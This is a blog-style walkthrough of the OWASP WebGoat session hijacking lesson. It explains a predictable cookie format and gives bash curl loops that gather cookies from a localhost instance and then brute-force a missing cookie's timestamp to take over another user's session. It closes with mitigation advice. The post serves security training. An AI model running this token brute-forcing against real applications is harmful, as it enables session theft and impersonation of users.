---
title: "Session Hijacking in OWASP WebGoat"
---

Session hijacking, also known as session stealing or session sniffing, is a critical security issue that can compromise the confidentiality and integrity of user data. In this post, we will explore the concept of session hijacking in the context of OWASP WebGoat, a deliberately insecure web application used for security training and testing.

It's important to note that a wealth of resources is already available to guide individuals through the process of solving this lesson. Some of these resources are:

[\[A1\] Hijacking a Session - WebGoat](https://www.youtube.com/watch?v=YO8rsCMVUyY)

[WebGoat Session Hijacking Tutorial: An In-Depth Guide](https://www.youtube.com/watch?v=R5YPRhM5GyE)

My goal is to provide additional details and discuss [how the lesson has been implemented](https://github.com/WebGoat/WebGoat/pull/1114/files), offering specific technical insights into the decisions made, the challenges encountered, the didactic point of view, and, of course, the solution that I consistently incorporate in my implementations— one that remains technology-agnostic.

## Understanding Session Hijacking: An Introduction

Session hijacking, often referred to as session stealing or session sniffing, revolves around exploiting vulnerabilities in the process of maintaining user sessions within web applications. In a typical web application, sessions are established to preserve user state between interactions, allowing for a seamless and personalized user experience. However, the very nature of this mechanism introduces security risks, with session hijacking being a prominent threat.

To execute session hijacking, attackers employ various techniques to intercept or manipulate session data. One common method involves the interception of session cookies, which are used to identify and authenticate users. Through techniques like packet sniffing, man-in-the-middle attacks, or cross-site scripting (XSS), malicious actors can gain unauthorized access to these session identifiers.

The implications of successful session hijacking are severe, as attackers can essentially impersonate legitimate users, accessing sensitive information or performing actions on their behalf. This compromise jeopardizes the confidentiality of user data and compromises the integrity of the application's functionality. Understanding the intricacies of session hijacking is paramount for developers and security practitioners to implement effective countermeasures and safeguard against this pervasive threat.

In the realm of OWASP WebGoat, a purposely insecure environment for educational purposes, session hijacking scenarios are intentionally integrated. Exploring these scenarios not only provides a hands-on experience for understanding the mechanics of session hijacking but also equips individuals with the knowledge needed to fortify web applications against such exploits. As we delve deeper into the practical aspects of session hijacking in the context of WebGoat, we gain insights into the real-world implications and the importance of adopting robust security measures.

## Exploring Session Hijacking in WebGoat: A Practical Exercise

The design of this scenario comprises several key components, offering a comprehensive view of session hijacking in the OWASP WebGoat environment. At the backend, a REST endpoint plays a pivotal role, responsible for collecting credentials through a POST request or, alternatively, by detecting the presence of a cookie named _hijack_cookie_. These collected data are then transmitted to the Authentication Provider, the system responsible for validating authentication.

Within the CAS (Central Authentication Service) package, the Authentication Provider manages an intentionally fragile implementation of Principal as an entity. This deliberately vulnerable mechanism controls the generation and verification of cookie identifiers, providing a realistic simulation of insecure authentication practices. The fragility of this system is crucial for educational purposes, allowing users to understand the intricacies of flawed authentication mechanisms and their susceptibility to exploitation.

Moving to the frontend, users encounter a typical login form. Here, if the cookie is not present, credentials must be entered to initiate the login process.

As we delve into the specifics of this exercise, we gain valuable insights into the underlying vulnerabilities and flawed design choices that contribute to the feasibility of session hijacking. This practical exploration equips individuals with the knowledge needed to recognize and address similar vulnerabilities in real-world web applications, reinforcing the educational value of OWASP WebGoat as a training platform for web security.

## Session Hijacking Exposed: Exploiting Vulnerabilities

Initiating the exploration, the first point of interest is the authentication panel:

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/wg-session-hijacking/loginform.png" />

Trying to log in triggers the creation of a cookie named _hijack_cookie_, with a value structured as follows:

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/wg-session-hijacking/cookielist.png" />

`3814082160704930327-1636910266991`

This unassuming cookie conceals the doorway to the vulnerability we are poised to exploit.

The _hijack_cookie_ is structured in two distinct parts, adhering to the following format:

`<sequential number>-<Unix epoch time>`

The initial segment of the cookie value is an identifier that increments with each instance of the cookie, while the portion following the dash represents a Unix epoch timestamp calculated at the time of the request.

An intriguing observation lies in occasional gaps within the initial value of the _hijack_cookie_, where one or more numbers are conspicuously absent. Such omissions signify instances where a user likely logged into the system, resulting in the generation of an authorized cookie specifically assigned to them.

Identifying these gaps becomes straightforward when we possess knowledge of the cookie values bracketing the valid user cookie. This understanding unveils a subtle yet exploitable pattern in the _hijack_cookie_ sequence.

To commence the exploitation process, send a few requests to the _/WebGoat/HijackSession/login_ endpoint without setting the _hijack_cookie_. This initial step is crucial as it allows us to gauge the application's response and begin the reconnaissance phase before launching the brute force attack. By understanding the behavior of the system when no _hijack_cookie_ is provided, we can strategically plan our approach for the subsequent stages of the attack.

```bash
for i in $(seq 1 10); do
curl 'http://localhost:8080/WebGoat/HijackSession/login'   \
-H 'Connection: keep-alive'   \
-H 'Accept: */*'   \
-H 'X-Requested-With: XMLHttpRequest'   \
-H 'User-Agent: any'   \
-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'   \
-H 'Origin: http://localhost:8080'   \
-H 'Sec-Fetch-Site: same-origin'   \
-H 'Sec-Fetch-Mode: cors'   \
-H 'Sec-Fetch-Dest: empty'   \
-H 'Referer: http://localhost:8080/WebGoat/start.mvc'   \
-H 'Accept-Language: en-US,en;q=0.9'   \
-H "Cookie: JSESSIONID=T_kki1UnFP7XTxdEqX-XmZ25qgmKDFtqyoeHyQhW"   \
--data-raw 'username=&password='   \
--compressed \
--output /dev/null \
-v
done
```

The following cookies are received:

```bash
<...>
< Set-Cookie: hijack_cookie=3026815832223943295-1636913556701; path=/WebGoat; secure
< Set-Cookie: hijack_cookie=3026815832223943296-1636913556848; path=/WebGoat; secure
< Set-Cookie: hijack_cookie=3026815832223943297-1636913556998; path=/WebGoat; secure
< Set-Cookie: hijack_cookie=3026815832223943299-1636913557143; path=/WebGoat; secure
<...>
```

Note: For the successful execution of this brute force attack, ensure that a valid WebGoat _JSESSIONID_ is utilized. Obtain this JSESSIONID by logging into WebGoat through the standard authentication process.

It becomes apparent that the _hijack_cookie_ starting with 3026815832223943298 is conspicuously absent. This specific value is the target of our brute force efforts, with the goal of figure out the second part of the cookie.

So our timestamp is in a range between 1636913556998 and 1636913557143. Now, the next step involves implementing a program capable of conducting a brute force attack within this time frame. This program will systematically iterate through potential values, allowing us to pinpoint the exact second part of the _hijack_cookie_ and ultimately exploit the vulnerability.

```bash
for i in $(seq 1636913556998 1636913557143); do
curl 'http://localhost:8080/WebGoat/HijackSession/login'   \
-H 'Connection: keep-alive'   \
-H 'Accept: */*'   \
-H 'X-Requested-With: XMLHttpRequest'   \
-H 'User-Agent: any'   \
-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'   \
-H 'Origin: http://localhost:8080'   \
-H 'Sec-Fetch-Site: same-origin'   \
-H 'Sec-Fetch-Mode: cors'   \
-H 'Sec-Fetch-Dest: empty'   \
-H 'Referer: http://localhost:8080/WebGoat/start.mvc'   \
-H 'Accept-Language: en-US,en;q=0.9'   \
-H "Cookie: JSESSIONID=T_kki1UnFP7XTxdEqX-XmZ25qgmKDFtqyoeHyQhW; hijack_cookie=3026815832223943298-"$i""   \
--data-raw 'username=&password='   \
--compressed
done
```

In our pursuit of the _hijack_cookie_ one of the numerous requests generated during the brute force attack will inevitably yield a valid login. The successful identification of this request will mark the lesson as completed.

## Insights: Mitigating Session Hijacking Risks

The exploration of session hijacking in the context of WebGoat has illuminated critical vulnerabilities inherent in authentication mechanisms. To safeguard web applications from such exploits, developers and security practitioners should prioritize the implementation of robust security measures.

Firstly, it's imperative to employ secure session management practices. Utilize session tokens with sufficient entropy, employ secure protocols like HTTPS to encrypt communication, and regularly rotate session identifiers to minimize the window of opportunity for attackers.

Additionally, stringent access controls must be enforced. Validate user credentials thoroughly and employ multi-factor authentication to add an extra layer of defense. Regularly audit and monitor user sessions to detect and respond promptly to any suspicious activity.

Educating development teams and security professionals on common attack vectors, such as session hijacking, is crucial. Platforms like OWASP WebGoat provide invaluable hands-on experience for understanding these threats. Regular training and awareness programs help in fostering a security-first mindset.
